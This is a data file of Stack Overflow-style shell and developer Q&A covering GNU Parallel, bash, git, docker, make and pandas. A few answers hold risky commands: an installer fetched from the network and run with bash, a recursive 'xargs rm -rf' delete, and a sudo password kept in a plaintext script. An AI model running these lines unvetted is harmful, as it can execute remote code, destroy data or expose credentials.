    "Execute multiple shell scripts concurrently": "If you have GNU Parallel http://www.gnu.org/software/parallel/ installed you can do this:\nparallel -j0 '{}; echo $?' ::: a.sh b.sh\nI have a suspicion that you want the exit code to check if one of them failed, and that you actually do not care what the precise exit code was. In that case you can do:\nparallel -j0 ::: a.sh b.sh || echo one or both of them failed\nIf it is sufficient to get the error code of the last that failed:\nparallel -j0 --halt 1 ::: a.sh b.sh; echo $?\nMaybe you would like to kill a.sh if b.sh finishes early but fails:\nparallel -j0 --halt 2 ::: a.sh b.sh; echo $?\nYou can install GNU Parallel simply by:\n$ (wget -O - pi.dk/3 || lynx -source pi.dk/3 || curl pi.dk/3/ || \\\n   fetch -o - http://pi.dk/3 ) > install.sh\n$ sha1sum install.sh | grep 883c667e01eed62f975ad28b6d50e22a\n12345678 883c667e 01eed62f 975ad28b 6d50e22a\n$ md5sum install.sh | grep cc21b4c943fd03e93ae1ae49e28573c0\ncc21b4c9 43fd03e9 3ae1ae49 e28573c0\n$ sha512sum install.sh | grep da012ec113b49a54e705f86d51e784ebced224fdf\n79945d9d 250b42a4 2067bb00 99da012e c113b49a 54e705f8 6d51e784 ebced224\nfdff3f52 ca588d64 e75f6033 61bd543f d631f592 2f87ceb2 ab034149 6df84a35\n$ bash install.sh\nWatch the intro videos for GNU Parallel to learn more: https://www.youtube.com/playlist?list=PL284C9FF2488BC6D1\nPrint the cheat sheet: https://www.gnu.org/software/parallel/parallel_cheat.pdf",
    "Simple way to colour alternate output lines in bash": "Not very pretty but does the trick:\n(save this to foo.bash and do grep whatever wherever | ./foo.bash)\n#!/bin/bash\nwhile read line\ndo\n  echo -e \"\\e[1;31m$line\"\n  read line\n  echo -e \"\\e[1;32m$line\"\ndone\necho -en \"\\e[0m\"\nHere you can find the list of color codes in bash.",
    "Change current directory with node": "To make it clear, you cannot change the pwd of the parent process. However you might change the working directory and start a shell in that folder.\nYou need to use process.chdir():\nconsole.log('Starting directory: ' + process.cwd());\ntry {\n  process.chdir('/tmp');\n  console.log('New directory: ' + process.cwd());\n}\ncatch (err) {\n  console.log('chdir: ' + err);\n}\nThis example is taken from the manual. Here you can find the manual.",
    "How to setup a SUDO_ASKPASS environment variable?": "So I am not sure I'd use $SUDO_ASKPASS for this. Basically the value of $SUDO_ASKPASS is to be an executable that will spit your password to standard out when invoked. So, if your password was 'foo', you could write a shell script as:\n#!/bin/bash\necho 'foo'\nand place it in ~/bin/pw.sh. Then you would set the environment variable and execute the command as so:\nSUDO_ASKPASS=${HOME}/bin/pw.sh sudo shutdown -h now\nthat example assumes that you're on Darwin; shutdown behaves differently on different operating systems.\nA more intelligent way of doing this (and more secure) is to use the NOPASSWD argument in /etc/sudoers. We would add a line like this:\njane ALL=NOPASSWD: /sbin/shutdown\nThis again assumes you're on a Mac. And that your name is Jane. Change that. This way sudo will not ask for a password when you issue the command /sbin/shutdown. The command to (properly) edit sudoers is visudo.",
    "Pipe emacs shell output to a new buffer": "You can just use M-! -- it will run the command within the same cwd as your shell buffer, and output the results to a *Shell Command Output* buffer.\nNote that if the results are brief, that buffer will not be raised and the output will be copied to the echo area; however the buffer is still used and available. C-hf shell-command RET has details of what constitutes \"brief\" output:\nIf the output is short enough to display in the echo area (determined by the variable max-mini-window-height if resize-mini-windows is non-nil), it is shown there. Otherwise, the buffer containing the output is displayed.",
    "How to grab an arbitrary chunk from a file on Unix/Linux [duplicate]": "You can use tail -c+N to trim the leading N bytes from input, then you can use head -cM to output only the first M bytes from its input.\n$ echo \"hello world 1234567890\" | tail -c+9 | head -c6\nrld 12\nSo using your variables, it would probably be:\ntail -c+$offset inputfile | head -c$datalength > outputfile\nAh, didn't see it had to seek. Leaving this as community wiki.",
    "How useful/difficult would it be for me to learn linux shell scripting? Alternative recommendations?": "Sounds like a fine plan. Some suggestions:\nLearn to automate everything you can. Make it a habit. If you do something more than a couple times, put it in a script. It's not just to avoid typing but to document the process. Improve your scripts as you notice problems. Share your scripts when appropriate.\nLearn the power of pipelining. Discover the purpose of the xargs command. Re-write a standard command line utility like grep or sort in the language of your choice. (I'm partial to Perl, but that's almost cheating. ;-)\nCustomize your .bashrc file. Know what settings you like and which ones don't work for you.\nUse ksh rather than bash for scripts. There aren't many differences, but ksh has a few extra features that are very nice to have. I prefer bash for interactive shells, however.\nSeems like the other answers suggest focusing on \"real programming languages\". I won't say that's bad advice, but in my experience too few programmers make good use of the command line. Over a career, good use of shell scripting saves countless hours and lots of tedium.\nLet me give you an example. This weekend I began putting new code into our production system. We had spent the previous week testing it and everything looked good. Ideally, you'd want to have a perfect clone of the operational system so that you're testing apples to apples. But we can't afford two copies of the hardware, so we borrow production machines to run tests on and swap them into production when we perform the upgrade.\nNow to distinguish between our operations and testing, we use two different accounts. So before putting a system into operations, we clean out certain files generated by the testing account. Basically it's a two step process:\nFind all the files created by the testing user.\nBlow them away.\nI imagine it would take me a minute or two to write the code to do that in Perl and another couple of minutes to test it. It's a simple job. I'm not even sure how to go about it in C/C++. I think you'd start with a stat of the root directory.\nBut everyone who has mastered shell scripting is jumping up and down, waving their hands and shouting out the answer, because you can write the code in the time it takes to type it:\n$ find /data -user test | xargs rm -rf\nTesting consists of running the command and watching for errors. This particular problem is a softball pitch right in the wheelhouse for bash. Perl gets the job done, but it's a bit less natural. (I'd use find2perl, which just adds a step.) Attempting this in C or C++ would be a quixotic quest. Those languages are designed to solve different problems.\nNow if you don't work in a UNIXy environment, there's probably a toolset designed for doing this sort of thing. (I'm no expert, but in Windows I'd probably run a search to get all the files in one window, select all and delete. Very nearly as easy. I don't know how to automate it, however.) But if you plan on finding a job in the UNIX/Linux world, you must be familiar with the command line so that you don't take 5 minutes to do a 30 second job.",
    "How to capture the Gradle exit code in a shell script?": "Exit status is in $?. Command substitutions capture output.\n./gradlew assembleDebug; gradlew_return_code=$?\n...or, if you need compatibility with set -e (which I strongly advise against using):\ngradlew_return_code=0\n./gradlew assembleDebug || gradlew_return_code=$?\n...or, if you need to capture both:\ngradlew_output=$(./gradlew assembleDebug); gradlew_return_code=$?\nif (( gradlew_return_code != 0 )); then\n  echo \"Grade failed with exit status $gradlew_return_code\" >&2\n  echo \"and output: $gradlew_output\" >&2\nfi\nNote that I do advise putting the capture on the same line as the invocation -- this avoids modifications such as added debug commands from modifying the return code before capture.\nHowever, you don't need to capture it at all here: if statements in shell operate on the exit status of the command they enclose, so instead of putting a test operation that inspects captured exit status, you can just put the command itself in the COMMAND section of your if:\nif ./gradlew assembleDebug; then\n  echo \"Gradle task succeeded\" >&2\nelse\n  echo \"Gradle task failed\" >&2\nfi",
    "Shell script: Remove hello world docker container without knowing ID": "In the docs of docker: Explore the Application it's described how you can do this.\nWhen you docker run hello-world, the container gets created with a random name that you can check with the following command:\ndocker container ls --all\nUnder the NAMES column of the output of the command you can check the generated name (you can see below on my example image. peaceful_morse in my case).\nThen you can use this name as a parameter when you call the docker remove command:\ndocker rm peaceful_morse\nImage with all the steps:",
    "How to source file from bash script": "You need to use:\nalias testScript=\". ~/scripts/test.sh\"\nto source the file. Or you can use source in place of ., but I don't much like C shells so I don't use C shell notations such as source.",
    "How to move all files in a directory that have a specific prefix?": "You should really look at a bash reference before you post a question like this.\nfor file in dir/system@*; do \n    mv \"$file\" /path/to/destination\ndone\nApparently I'm more tired than I thought. 3coins' comment is even better:\nmv dir/system@* /path/to/destination\nAssuming you don't have enough matching files to exceed the maximum command line length.",
    "Generate PDF Behind Authentication Wall": "Every login form will be different for every site. What you're going to want to do is determine what all you need to pass in to that login form's target by reading the HTML on the page (which you're probably aware of). It may take an additional hidden field on top of the username/password fields to prevent cross site request forgeries.\nThe cookie jar parameter is a file that it stores the cookies it gets back from the webserver in. You need to specify it in the first request to the login form, and in subsequent requests to continue to use the cookie/session information that the webserver will have given you back after logging in.\nSo to sum it up:\nLook and see if there are any additional parameters on the page required.\nMake sure the URL you are submitting to is the same as the ACTION attribute of the form element on that page.\nUse the --cookie-jar parameter in both the login request and the second content request.\nThe syntax for the --post parameters are --post username user_name_value --post password password_value",
    "Linux Shell: VLC programming": "You need to use dbus interface of VLC.\nNow, you can use the mpris interface of VLC. It's a standard for most players like clementine, banshee, songbird, spotify etc.\nSo, lets suppose you want to Pause the currently playing song.\ndbus-send --print-reply --session --dest=org.mpris.vlc /Player org.freedesktop.MediaPlayer.Pause\nTo play a song:\ndbus-send --print-reply --session --dest=org.mpris.vlc /Player org.freedesktop.MediaPlayer.Play\nI generally use qdbusviewer to know about the dbus-interface available to me.",
    "Merging two files with cat without new line": "You could use head with -1 as the -c flags parameter and -q\nhead -c -1 -q file1 file2 > file3\nhead -c -1 will output everything up to the last 1 byte of the code (in this case the last 1 byte - endline - wont be included). The -q is so the filenames dont get piped to file3 as head does by default when heading multiple files.\nOr, as suggested by this answer - bash cat multiple files content in to single string without newlines , pipe it to tr:\ntr -d \"\\n\"",
    "Does there exist standard way to run external program in Common Lisp?": "No, there is no standard way, but there are libraries which provide this functionality for the important implementations. For example, there's trivial-shell available in Quicklisp, which provides shell-command. (I didn't actually test it, but its among the recommended libraries on CLiki.) There is also external-program. Update: inferior-shell seems to be prefered these days, as Ehvince points out in a comment and his own answer.\nYou could also use read-time conditionals to make different implementations use their respective functionality to do this.\nCCL has ccl:run-program, for example:\nCL-USER> (run-program \"whoami\" '() :output *standard-output*)\nfoobar\n#<EXTERNAL-PROCESS (whoami)[NIL] (EXITED : 0) #xC695EA6>",
    "Shell script to make site https using certbot and nginx": "Though i am very late here but finally i did as suggested by @JohnHanley in the comments. I went through the documentation and here is what i needed to execute the above mentioned steps in the question by command line.\nrun            Obtain & install a certificate in your current webserver\n\n-n             Run without ever asking for user input. This may\n               require additional command line flags; the client will\n               try to explain which ones are required if it finds one\n               missing (default: False)\n\n--nginx        Obtain and install certificates using Nginx (default:False)\n\n\n-d             Domain names to apply. For multiple domains you can\n               use multiple -d flags or enter a comma separated list\n               of domains as a parameter. The first domain provided\n               will be the subject CN of the certificate, and all\n               domains will be Subject Alternative Names on the\n               certificate. The first domain will also be used in\n               some software user interfaces and as the file paths\n               for the certificate and related material unless\n               otherwise specified or you already have a certificate\n               with the same name. In the case of a name collision it\n               will append a number like 0001 to the file path name.\n\n\n-m             Email used for registration and recovery contact. Use\n               comma to register multiple emails, ex:\n               u1@example.com,u2@example.com. (default: Ask).\n\n--redirect     Automatically redirect all HTTP traffic to HTTPS for\n               the newly authenticated vhost. (default: Ask)\n\n--agree-tos    Agree to the ACME server's Subscriber Agreement\nSo the final command that i executed is below\ncertbot run -n --nginx --agree-tos -d example.com,www.example.com  -m  mygmailid@gmail.com  --redirect",
    "Run docker-compose from bash script file": "You can call them separately:\n#!/bin/bash\ndocker-compose -f docker-compose.yml up -d\ndocker-compose -f docker-compose-mongo.yml up -d\nOr combine both nginx and mongo services in the same docker-compose.yml.",
    "Can I add changes to staging area from another branch?": "Use git cherry-pick with the -n|--no-commit option and then interactively select what to commit:\ngit cherry-pick\n...\n-n, --no-commit\nUsually git cherry-pick automatically creates a sequence of commits. This flag applies the changes necessary to cherry-pick each named commit to your working tree and the index, without making any commit. In addition, when this option is used, your index does not have to match the HEAD commit. The cherry-pick is done against the beginning state of your index.\nThis is useful when cherry-picking more than one commits' effect to your index in a row.\nSo the sequence of commands will be the following:\ngit cherry-pick -n <commitid>  # merge commitid into the index and working-tree\ngit reset                      # clear the index\ngit add -p                     # selectively add merged changes to the index\nAlternatively, you can use git reset -p to remove undesired hunks from the staging area:\ngit cherry-pick -n <commitid>  # merge commitid into the index and working-tree\ngit reset -p   # interactively remove from the index changes brought by commitid",
    "How to capture full output of `git clone`?": "By default Git will display the cloning progress only when the standard error stream is directed to a terminal. Since you're redirecting it to the pipe, the output stream is no longer attached to the terminal. So in order to capture the output, you need to add --progress parameter to force the progress status, e.g.\ngit clone --progress https://github.com/foo/bar 2> out.log\nor, in order to store the output in a shell variable\nout=$(git clone --progress https://github.com/foo/bar 2>&1)\nSee: man git-clone\n--progress\nProgress status is reported on the standard error stream by default when it is attached to a terminal, unless -q is specified. This flag forces progress status even if the standard error stream is not directed to a terminal.\nTo force the terminal in any other way, you'll have to preload some library to force isatty() to return always true (see: man isatty). This function is used by git across the source code.",
    "When running a Django dev server with docker/fig, why is some of the log output hidden?": "I found this old issue today using docker composer. Python logging module checks the output is a terminal so you need to add tty: true to the service. Example:\nversion: '2'\nservices:\n  django:\n    tty: true\n    command: python -u manage.py runserver 0.0.0.0:8080\n    ports:\n    - \"8080:8080\"",
    "If string contains in case statement": "How do you initialize $DUMPFILE? If I run the following, the output is information_schema, which is what I expected...\n#!/bin/bash\nDUMPFILE=mysql_dumps/tpmysqldump-tps_dev_russell_development-information_schema-2014-03-26.sql\ncase $DUMPFILE in\n    *\"tpdata\"*)\n        database=\"tpdata\";;\n    *\"tpmrbs\"*)\n        database=\"tpmrbs\";;\n    *\"information_schema\"*)\n        database=\"information_schema\";;\n    *\"performance_schema\"*)\n        database=\"performance_schema\";;\n    *)\n        echo \"INVALID FILE\";;\nesac\necho $database",
    "Error: Could not find or load main class xxx Linux": "navigate to /home/scripts using terminal\njavac com/util/Hello.java \nthen\ncd /home/scripts\njava -cp . com.util.Hello\nOr,\njava -cp \"/home/scripts\" com.util.Hello   ",
    "lsof should give all open files for a set of pids": "The lsof -p option takes a comma-separated list of PIDs. The way you're using xargs will pass the pids as separate arguments leading some to be interpreted as filenames.\nTry lsof -p $(your grep | tr '\\012' ,) That's going to have a trailing comma, I'm not sure if lsof will care but you could sed it off if necessary.",
    "How to emulate 'cp --update' behavior on Mac OS X?": "rsync has an -u/--update option that works just like GNU cp:\n$ rsync -u src dest",
    "Gitlab Shell Script Permission Denied": "",
    "Zsh pipe all output to command": "&> only redirects standard output and standard error, not all file descriptors that command might write to. The equivalent pipe, though, is\ncommand |& grep  # Equivalent to command 2>&1 | grep",
    "Can't pause nano in terminal": "I was looking for a solution to this and the accepted answer didn't help me.\nSetting set suspend in ~/.nanorc works!\nhttp://www.nano-editor.org/dist/v2.2/nanorc.5.html",
    "How to provide a prepared git commit message?": "The commit command has an option for reading a commit message from a template:\n -t <file>, --template=<file>\n       When editing the commit message, start the editor with the contents\n       in the given file. The commit.template configuration variable is often\n       used to give this option implicitly to the command. This mechanism can\n       be used by projects that want to guide participants with some hints on\n       what to write in the message in what order. If the user exits the editor\n       without editing the message, the commit is aborted. This has no effect\n       when a message is given by other means, e.g. with the -m or -F options.",
    "Why a variable assignment replaces tabs with spaces": "You need to quote your variable $res for whitespace to be preserved.\n$ cat file\na       b e     c       d\n\n$ res=$(cat file)\n\n$ echo $res\na b e c d\n\n$ echo \"$res\"\na       b e     c       d\nFrom man bash under QUOTING:\nQuoting is used to remove the special meaning of certain characters or words to the shell. Quoting can be used to disable special treatment for special characters, to prevent reserved words from being recognized as such, and to prevent parameter expansion.\nEach of the metacharacters listed above under DEFINITIONS has special meaning to the shell and must be quoted if it is to represent itself.\n...\n\n\\a     alert (bell)\n\\b     backspace\n\\e\n\\E     an escape character\n\\f     form feed\n\\n     new line\n\\r     carriage return\n\\t     horizontal tab\n\\v     vertical tab\n\\\\     backslash\n\\'     single quote\n\\\"     double quote\n\\nnn   the eight-bit character whose value is the octal value nnn\n\\xHH   the eight-bit character whose value is the hexadecimal value HH\n\\cx    a control-x character\n\n...",
    "Best Icon size for displaying in the tray": "You should be using 32bpp icons with partial transparency for best effect.\nThe icon uses the small system size. Get this by calling GetSystemMetrics passing SM_CXSMICON. If you use font scaling this can be, for example, 20px rather than the more common 16px. I've never found MS documentation for this fact but you can readily verify it for yourself by trial and error. Not really a happy state of affairs, but it is what it is.\nUpdate: TOndrej points out that the docs for LoadIconMetric gives tacit approval of the notification area icon being small icon size. I don't understand why this information is not included with that for notification icons.",
    "Stop executing makefile": "You can probably achieve what you want with a match-anything rule. Example (using a dummy printf recipe instead of a real one):\nPARAMS := $(filter-out run,$(MAKECMDGOALS))\n\nrun:\n    @printf './bin/run.sh $(PARAMS)\\n'\n\n%:;\nDemo:\n$ make run my custom input params\n./bin/run.sh my custom input params\nmake: 'my' is up to date.\nmake: 'custom' is up to date.\nmake: 'input' is up to date.\nmake: 'params' is up to date.\nYou can ignore the make: 'target' is up to date. messages or use the --quiet option (or --silent or -s):\n$ make --quiet run my custom input params\n./bin/run.sh my custom input params\nIf your Makefile is more complex than this, the match-anything rule could be a problem because it could catch other targets that you do not want to be caught. In this case make conditionals are an option:\nifeq ($(SECONDPASS),)\nPARAMS := $(filter-out run,$(MAKECMDGOALS))\n\nrun:\n    @$(MAKE) --quiet $@ PARAMS='$(PARAMS)' SECONDPASS=true\n\n%:;\nelse\nrun:\n    @printf './bin/run.sh $(PARAMS)\\n'\n\n# other rules if any\nendif\nFinally, if the name of the first goal is not always the same, you can adapt this with:\nGOAL   := $(firstword $(MAKECMDGOALS))\nPARAMS := $(filter-out $(GOAL),$(MAKECMDGOALS))\n\n$(GOAL):\n    @printf './bin/$(GOAL).sh $(PARAMS)\\n'\n\n%:;\nOr:\nGOAL   := $(firstword $(MAKECMDGOALS))\n\nifeq ($(SECONDPASS),)\nPARAMS := $(filter-out $(GOAL),$(MAKECMDGOALS))\n\n$(GOAL):\n    @$(MAKE) --quiet $@ PARAMS='$(PARAMS)' SECONDPASS=true\n\n%:;\nelse\n$(GOAL):\n    @printf './bin/$(GOAL).sh $(PARAMS)\\n'\n\n# other rules if any\nendif\nDemo:\n$ make --quiet nur foo bar\n./bin/nur.sh foo bar",
    "How to print to stderr in fish shell?": "You can redirect the output to stderr, for example:\necho \"Error: $argv[1] is not a valid option\" 1>&2\nAs a reference, here are some common IO-redirections that work in fish*.\nfoo 1>&2 # Redirects stdout to stderr, same as bash\n\nbar 2>&1 # Redirects stderr to stdout, same as bash\n\nbar ^&1  # Redirects stderr to stdout, the fish way using a caret ^\n* The file descriptors for stdin, stdout, and stderr are 0, 1, and 2.\n* The & implies you want to redirect to a file stream instead of a file.\n* Comparison of redirection in various shells (bash, fish, ksh, tcsh, zsh)",
    "Cannot run npm in a shell script": "If your node and npm are installed in /root/.nvm/versions/node/v6.10.0/bin then adding this to your script should solve the problem:\nPATH=\"/root/.nvm/versions/node/v6.10.0/bin:$PATH\"\nAlternatively you can try using absolute paths like:\n/root/.nvm/versions/node/v6.10.0/bin/npm install\netc. but note that if you have your Node installed from the binary packages and not from sources then your shebang line in the npm binary will likely be #!/usr/bin/env node which will not work when the correct version of Node in the PATH - see this answer for more info:\nUnable to remove global package\nWhen Node was installed from the sources then npm will have a correct shebang line with absolute path to the node binary and can be used wven when node is not in the PATH.",
    "How to merge log files and sort by time": "Ref: Merging multiple log files by date including multilines\nAs mentioned in the above question, if you are certain that all the log lines start with timestamp, you can do:\ncat logA.log logB.log | sort -n \nThis would not work when there are other lines such as stack trace which do not start with timestamp.\nI think you can check out the above question and answers if your considering a similar scenario.",
    "How to print a df in Terminal without loosing format?": "DOCUMENTATION\nThere are 2 things going on that control for the formatting you may see.\nControlling for the the character width that the display can handle.\nThis is handled with the pandas option display.width and can be seen with print pd.get_option('display.width'). The default is 80.\nThe second control is the number of columns in the dataframe to display.\nThis is handled with the pandas option display.max_columns and can be seen with print pd.get_option('display.max_columns'). The default is 20.\ndisplay.width\nLet's explore what this does with a sample dataframe\nimport pandas as pd\n\ndf = pd.DataFrame([range(40)], columns=['ABCDE%d' % i for i in range(40)])\n\nprint df # this is with default 'display.width' of 80\n\n   ABCDE0  ABCDE1  ABCDE2  ABCDE3  ABCDE4  ABCDE5  ABCDE6  ABCDE7  ABCDE8  \\\n0       0       1       2       3       4       5       6       7       8   \n\n   ABCDE9   ...     ABCDE30  ABCDE31  ABCDE32  ABCDE33  ABCDE34  ABCDE35  \\\n0       9   ...          30       31       32       33       34       35   \n\n   ABCDE36  ABCDE37  ABCDE38  ABCDE39  \n0       36       37       38       39  \n\n[1 rows x 40 columns]\npd.set_option('display.width', 40)\nprint df\n\n   ABCDE0  ABCDE1  ABCDE2  ABCDE3  \\\n0       0       1       2       3   \n\n   ABCDE4  ABCDE5  ABCDE6  ABCDE7  \\\n0       4       5       6       7   \n\n   ABCDE8  ABCDE9   ...     ABCDE30  \\\n0       8       9   ...          30   \n\n   ABCDE31  ABCDE32  ABCDE33  ABCDE34  \\\n0       31       32       33       34   \n\n   ABCDE35  ABCDE36  ABCDE37  ABCDE38  \\\n0       35       36       37       38   \n\n   ABCDE39  \n0       39  \n\n[1 rows x 40 columns]\npd.set_option('display.width', 120)\nThis should scroll to the right.\nprint df\n\n   ABCDE0  ABCDE1  ABCDE2  ABCDE3  ABCDE4  ABCDE5  ABCDE6  ABCDE7  ABCDE8  ABCDE9   ...     ABCDE30  ABCDE31  ABCDE32  \\\n0       0       1       2       3       4       5       6       7       8       9   ...          30       31       32   \n\n   ABCDE33  ABCDE34  ABCDE35  ABCDE36  ABCDE37  ABCDE38  ABCDE39  \n0       33       34       35       36       37       38       39  \n\n[1 rows x 40 columns]\ndisplay.max_columns\nLet's put 'display.width' back to 80 with pd.set_option('display.width,80)\nNow let's explore different values of 'display.max_columns'\nprint df # default 20\n\n   ABCDE0  ABCDE1  ABCDE2  ABCDE3  ABCDE4  ABCDE5  ABCDE6  ABCDE7  ABCDE8  \\\n0       0       1       2       3       4       5       6       7       8   \n\n   ABCDE9   ...     ABCDE30  ABCDE31  ABCDE32  ABCDE33  ABCDE34  ABCDE35  \\\n0       9   ...          30       31       32       33       34       35   \n\n   ABCDE36  ABCDE37  ABCDE38  ABCDE39  \n0       36       37       38       39  \n\n[1 rows x 40 columns]\nNotice the ellipses in the middle. There are 40 columns in this data frame, to get to a display count of 20 max columns, pandas took the first 10 columns 0:9 and the last 10 columns 30:39 and put an ellipses in the middle.\npd.set_option('display.max_columns', 30)\nprint df\n\n   ABCDE0  ABCDE1  ABCDE2  ABCDE3  ABCDE4  ABCDE5  ABCDE6  ABCDE7  ABCDE8  \\\n0       0       1       2       3       4       5       6       7       8   \n\n   ABCDE9  ABCDE10  ABCDE11  ABCDE12  ABCDE13  ABCDE14   ...     ABCDE25  \\\n0       9       10       11       12       13       14   ...          25   \n\n   ABCDE26  ABCDE27  ABCDE28  ABCDE29  ABCDE30  ABCDE31  ABCDE32  ABCDE33  \\\n0       26       27       28       29       30       31       32       33   \n\n   ABCDE34  ABCDE35  ABCDE36  ABCDE37  ABCDE38  ABCDE39  \n0       34       35       36       37       38       39  \n\n[1 rows x 40 columns]\nNotice the width of characters stayed the same but I have more columns. pandas took the first 15 columns 0:14 and the last 15 columns 26:39.\nTo get all of your columns displayed, you need to set this option to be at least as big as the number of columns you want displayed.\npd.set_option('display.max_columns', 40)\nprint df\n\n   ABCDE0  ABCDE1  ABCDE2  ABCDE3  ABCDE4  ABCDE5  ABCDE6  ABCDE7  ABCDE8  \\\n0       0       1       2       3       4       5       6       7       8   \n\n   ABCDE9  ABCDE10  ABCDE11  ABCDE12  ABCDE13  ABCDE14  ABCDE15  ABCDE16  \\\n0       9       10       11       12       13       14       15       16   \n\n   ABCDE17  ABCDE18  ABCDE19  ABCDE20  ABCDE21  ABCDE22  ABCDE23  ABCDE24  \\\n0       17       18       19       20       21       22       23       24   \n\n   ABCDE25  ABCDE26  ABCDE27  ABCDE28  ABCDE29  ABCDE30  ABCDE31  ABCDE32  \\\n0       25       26       27       28       29       30       31       32   \n\n   ABCDE33  ABCDE34  ABCDE35  ABCDE36  ABCDE37  ABCDE38  ABCDE39  \n0       33       34       35       36       37       38       39  \nNo ellipses, all columns are displayed.\nCombining both options together\nPretty simple at this point. pd.set_option('display.width', 1000) use 1000 to allow for something long. pd.set_option('display.max_columns', 1000) also allowing for wide dataframes.\nprint df\n\n   ABCDE0  ABCDE1  ABCDE2  ABCDE3  ABCDE4  ABCDE5  ABCDE6  ABCDE7  ABCDE8  ABCDE9  ABCDE10  ABCDE11  ABCDE12  ABCDE13  ABCDE14  ABCDE15  ABCDE16  ABCDE17  ABCDE18  ABCDE19  ABCDE20  ABCDE21  ABCDE22  ABCDE23  ABCDE24  ABCDE25  ABCDE26  ABCDE27  ABCDE28  ABCDE29  ABCDE30  ABCDE31  ABCDE32  ABCDE33  ABCDE34  ABCDE35  ABCDE36  ABCDE37  ABCDE38  ABCDE39\n0       0       1       2       3       4       5       6       7       8       9       10       11       12       13       14       15       16       17       18       19       20       21       22       23       24       25       26       27       28       29       30       31       32       33       34       35       36       37       38       39\nUsing your data\nprint df\n\n   TFs    No  Esenciales  Genes  regulados  Genes.1  Regulados  Positivamente  Genes.2  Regulados.1  Negativamente  No.1  Tentativo  de  genes   a  silenciar  No.2  Real  de.1  genes.1  a.1  silenciar.1  No.3  Tentativo.1  de.2  genes.2  a.2  inducir\n0  146  YdeO          20     18          2        2          2              0      NaN          NaN            NaN   NaN        NaN NaN    NaN NaN        NaN   NaN   NaN   NaN      NaN  NaN          NaN   NaN          NaN   NaN      NaN  NaN      NaN\nBIG CAVEAT\nWhen you run this, you may not see this scrolling magic that you do here. This is because your terminal probably doesn't scroll to the right. Below is a screen shot from jupyter-notebook. It doesn't look right because the text is being wrapped. However, there are no new lines in the string where it wraps as evidenced by the fact that when I copied and pasted it to stack overflow, it displays appropriately.",
    "top 'xterm': unknown terminal type": "try adding\nexport TERM=linux\nat the end of your .bashrc files (/home/myuser/.bashrc, /root/.bashrc). The problem is that the terminal definition 'xterm' is undefined",
    "mongodb script file": "You can do it with shell script. You can execute the commands using the following command.\n./mongo server:27017/dbname --quiet my_commands.js\nFor details check Scripting the shell document in Mongo docs.",
    "Attach to 'screen' session with creating a new screen window": "Add new detached window to sesion_name and run command\nscreen -S sesion_name -x -X screen bash -c 'command; exec bash'",
    "How can I display a tux character in a shell script?": "There's a penguin character in UNICODE. No font on my machine seems to be able to render it, but I'm using Linux, not MacOS, so your mileage may vary.",
    "Linux: Run a binary in a script": "If ./program works in the shell, why not use it in your script?\n#!/bin/sh\ncd /home/user/path_to_the_program/\n./program\nsh program launches sh to try and interpret program as a shell script. Most likely it's not a script but some other executable file, which is why it fails.",
    "VBA Shell and Wait with Exit Code": "Have a look at WaitForSingleObject and GetExitCodeProcess functions.\nExample Usage:\nPrivate Declare Function GetExitCodeProcess Lib \"kernel32\" (ByVal hProcess As Long, lpExitCode As Long) As Long\nPrivate Declare Function WaitForSingleObject Lib \"kernel32\" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long\nPrivate Declare Function OpenProcess Lib \"kernel32\" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long\nPrivate Declare Function CloseHandle Lib \"kernel32\" (ByVal hObject As Long) As Long\nPrivate Declare Function FormatMessage Lib \"kernel32\" Alias \"FormatMessageA\" (ByVal dwFlags As Long, lpSource As Any, ByVal dwMessageId As Long, ByVal dwLanguageId As Long, ByVal lpBuffer As String, ByVal nSize As Long, Arguments As Long) As Long\n\nPublic Const INFINITE = &HFFFF\nPublic Const PROCESS_ALL_ACCESS = &H1F0FFF\n\nSub RunApplication(ByVal Cmd as String)\n\n    lTaskID = Shell(Cmd, vbNormalFocus)\n    ' Get process handle\n    lPID = OpenProcess(PROCESS_ALL_ACCESS, True, lTaskID)\n    If lPID Then\n        ' Wait for process to finish\n        Call WaitForSingleObject(lPID, INFINITE)\n        ' Get Exit Process\n        If GetExitCodeProcess(lPID, lExitCode) Then\n            ' Received value\n            MsgBox \"Successfully returned \" & lExitCode, vbInformation\n        Else\n            MsgBox \"Failed: \" & DLLErrorText(Err.LastDllError), vbCritical\n        End If\n    Else\n        MsgBox \"Failed: \" & DLLErrorText(Err.LastDllError), vbCritical\n    End If\n    lTaskID = CloseHandle(lPID)\nEnd Sub\n\nPublic Function DLLErrorText(ByVal lLastDLLError As Long) As String\n    Dim sBuff As String * 256\n    Dim lCount As Long\n    Const FORMAT_MESSAGE_ALLOCATE_BUFFER = &H100, FORMAT_MESSAGE_ARGUMENT_ARRAY = &H2000\n    Const FORMAT_MESSAGE_FROM_HMODULE = &H800, FORMAT_MESSAGE_FROM_STRING = &H400\n    Const FORMAT_MESSAGE_FROM_SYSTEM = &H1000, FORMAT_MESSAGE_IGNORE_INSERTS = &H200\n    Const FORMAT_MESSAGE_MAX_WIDTH_MASK = &HFF\n\n    lCount = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM Or FORMAT_MESSAGE_IGNORE_INSERTS, 0, lLastDLLError, 0&, sBuff, Len(sBuff), ByVal 0)\n    If lCount Then\n        DLLErrorText = Left$(sBuff, lCount - 2) ' Remove line feeds\n    End If\n\nEnd Function",
    "How do I automatically set the $DISPLAY variable for my current session?": "Here's something I've just knocked up. It inspects the environment of the last-launched \"gnome-session\" process (DISPLAY is set correctly when VNC launches a session/window manager). Replace \"gnome-session\" with the name of whatever process your VNC server launches on startup.\nPID=`pgrep -n -u $USER gnome-session`\nif [ -n \"$PID\" ]; then\n    export DISPLAY=`awk 'BEGIN{FS=\"=\"; RS=\"\\0\"}  $1==\"DISPLAY\" {print $2; exit}' /proc/$PID/environ`\n    echo \"DISPLAY set to $DISPLAY\"\nelse\n    echo \"Could not set DISPLAY\"\nfi\nunset PID\nYou should just be able to drop that in your .bashrc file.",
